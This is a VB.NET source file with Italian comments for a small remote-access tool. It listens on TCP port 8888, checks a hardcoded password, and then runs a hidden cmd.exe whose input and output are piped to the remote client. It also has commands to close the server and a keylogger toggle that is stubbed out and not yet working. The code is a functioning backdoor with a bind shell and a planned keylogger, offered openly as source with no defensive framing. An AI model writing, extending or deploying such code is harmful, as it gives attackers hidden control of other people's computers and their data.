Imports System.Net.Sockets
Imports System.Text
Imports System.Net
Imports System.Diagnostics
Imports System.Windows.Forms
Imports System.Threading.Tasks

Module Module1
    Const PASSWORD As String = "melanzana"

    'CMD variabili
    Private psi As ProcessStartInfo
    Private cmd As Process
    Private Delegate Sub InvokeWithString(ByVal text As String)
    Dim flgcmd As Boolean = False

    'variabili generali
    Dim IP_remoto As String = vbNullString
    Dim serverSocket As TcpListener = Nothing
    Dim clientSocket As TcpClient = Nothing
    Dim networkStream As NetworkStream

    'keylogger variabili
    Dim flgkeylogger As Boolean = False

    Sub Main()
        serverSocket = New TcpListener(8888)
        clientSocket = New TcpClient
        networkStream = Nothing

        serverSocket.Start()
        msg("Server Iniziato ....")

        While (True)
top:
            flgcmd = False
            clientSocket = serverSocket.AcceptTcpClient()

            'legge l'ip del client che si sta connettendo
            Dim ipend As Net.IPEndPoint = clientSocket.Client.RemoteEndPoint
            IP_remoto = ipend.Address.ToString()

            Dim bytesFrom(65536) As Byte
            Dim dataFromClient As String = vbNullString

            Try
                networkStream = clientSocket.GetStream()
                networkStream.Read(bytesFrom, 0, CInt(clientSocket.ReceiveBufferSize))
                dataFromClient = System.Text.Encoding.ASCII.GetString(bytesFrom)
                dataFromClient = dataFromClient.Substring(0, dataFromClient.IndexOf("$"))
            Catch ex As Exception
                Continue While
            End Try


            ' controllo correttezza password
            If dataFromClient <> PASSWORD Then
                ' password non corretta
                Errore(Errori.Password)
                Continue While
            Else
                SendMessage("PASSWORD OK")
            End If

            Threading.Thread.Sleep(1)

            ReDim bytesFrom(65536)
            dataFromClient = vbNullString

            While (True)
                Try
                    networkStream = clientSocket.GetStream()
                    networkStream.Read(bytesFrom, 0, CInt(clientSocket.ReceiveBufferSize))
                    dataFromClient = System.Text.Encoding.ASCII.GetString(bytesFrom)
                    dataFromClient = dataFromClient.Substring(0, dataFromClient.IndexOf("$"))

                    ' CMD
                    ' se sono in modalità CMD
                    If flgcmd Then
                        cmd.StandardInput.WriteLine(dataFromClient)
                        Continue While
                    End If

                    'se si disconnette riparti col ciclo per evitare
                    'di inviare il messaggio a tutti
                    Dim comandi() As String
                    comandi = Split(dataFromClient, " ")


                    'controllo del comando mandato
                    Select Case comandi(0)
                        Case "/chiudi"
                            'chiudo il server
                            Environment.Exit(0)

                        Case "/disconnetti"
                            ' disconnetto
                            Exit While

                        Case "/cmd"
                            'attiva cmd
                            SendMessage("***** CMD in attivazione... *****")
                            AttivaCMD()
                            Continue While

                        Case "/keylogger"
                            ' keylogger
                            Continue While
                            SendMessage("***** KEYLOGGER NON ANCORA DISPONIBILE *****")
                            If comandi.Count < 2 Then
                                SendMessage("Sintassi non corretta, digitare /keylog + on/off")
                                Continue While
                            End If

                            Dim affermativo() As String = {"on", "1", "true", "si", "yes", "s", "y", "Y", "S"}
                            If affermativo.Contains(comandi(1)) Then
                                SendMessage("***** KEYLOGGER attivato *****")

                            Else
                                SendMessage("***** KEYLOGGER disattivato *****")
                            End If
                            Continue While

                        Case "/help"
                            Dim msg As String
                            msg = "Comandi disponibili:" & vbNewLine & _
                                "/chiudi              per la chiusura del server" & vbNewLine & _
                                "/disconnetti         per chiudere la sessione attuale" & vbNewLine & _
                                "/cmd                 per attivare la modalità CMD" & vbNewLine & _
                                "/keylogger [on/off]  per attivare il keylogger"
                            SendMessage(msg)
                            Continue While

                        Case Else
                            Errore(Errori.Comando)
                            SendMessage("Utilizzare ""/help"" per l'elenco dei comandi")
                            Continue While
                    End Select

                Catch ex As Exception
                    'se c'è un errore smetti di eseguire
                    Errore(Errori.Generico)
                    GoTo top
                End Try
            End While

        End While

        clientSocket.Close()
        serverSocket.Stop()
        msg("exit")
        Console.ReadLine()
    End Sub

    Private Sub Errore(ByVal err As Errori)
        SendMessage("ERRORE " & err)
    End Sub

    Private Sub SendMessage(ByVal messaggio As String)
        msg(messaggio)
        ' aggiusto il messaggio
        messaggio = AggiustaMessaggio(messaggio)
        ' creo il flusso
        Try
            Dim privataStream As NetworkStream = clientSocket.GetStream()
            Dim privataBytes As [Byte]()
            ' trasmetto i dati
            privataBytes = Encoding.ASCII.GetBytes(messaggio)
            privataStream.Write(privataBytes, 0, privataBytes.Length)
            privataStream.Flush()
        Catch ex As Exception
        End Try
    End Sub

    Sub msg(ByVal mesg As String)
        mesg.Trim()
        Console.WriteLine(" >> " + mesg)
    End Sub

    Private Function AggiustaMessaggio(ByVal messaggio As String) As String
        AggiustaMessaggio = messaggio.Replace("à", "a'").Replace("è", "e'").Replace("é", "e'").Replace("ì", "i'").Replace("ò", "o'").Replace("ù", "u'")
    End Function

    Private Enum Errori
        Password
        Comando
        Generico
    End Enum

#Region "Zona CMD"
    Private Sub AttivaCMD()
        flgcmd = True
        psi = New ProcessStartInfo("cmd.exe")

        Dim systemencoding As System.Text.Encoding = _
            System.Text.Encoding.GetEncoding(Globalization.CultureInfo.CurrentUICulture.TextInfo.OEMCodePage)

        With psi
            .UseShellExecute = False  ' Required for redirection
            .RedirectStandardError = True
            .RedirectStandardOutput = True
            .RedirectStandardInput = True
            .CreateNoWindow = True
            .StandardOutputEncoding = systemencoding  ' Use OEM encoding for console applications
            .StandardErrorEncoding = systemencoding
        End With

        ' EnableraisingEvents is required for Exited event
        cmd = New Process With {.StartInfo = psi, .EnableRaisingEvents = True}

        AddHandler cmd.ErrorDataReceived, AddressOf Async_Data_Received
        AddHandler cmd.OutputDataReceived, AddressOf Async_Data_Received
        AddHandler cmd.Exited, AddressOf CMD_Exited

        cmd.Start()
        ' Start async reading of the redirected streams
        ' Without these calls the events won't fire
        cmd.BeginOutputReadLine()
        cmd.BeginErrorReadLine()
    End Sub

    Private Sub CMD_Exited(ByVal sender As Object, ByVal e As EventArgs)
        flgcmd = False
        SendMessage("***** Fine CMD *****")
    End Sub

    Private Sub Async_Data_Received(ByVal sender As Object, ByVal e As DataReceivedEventArgs)
        Sync_Output(e.Data & vbNewLine)
    End Sub

    Private Sub Sync_Output(ByVal text As String)
        SendMessage(text)
    End Sub
#End Region


End Module
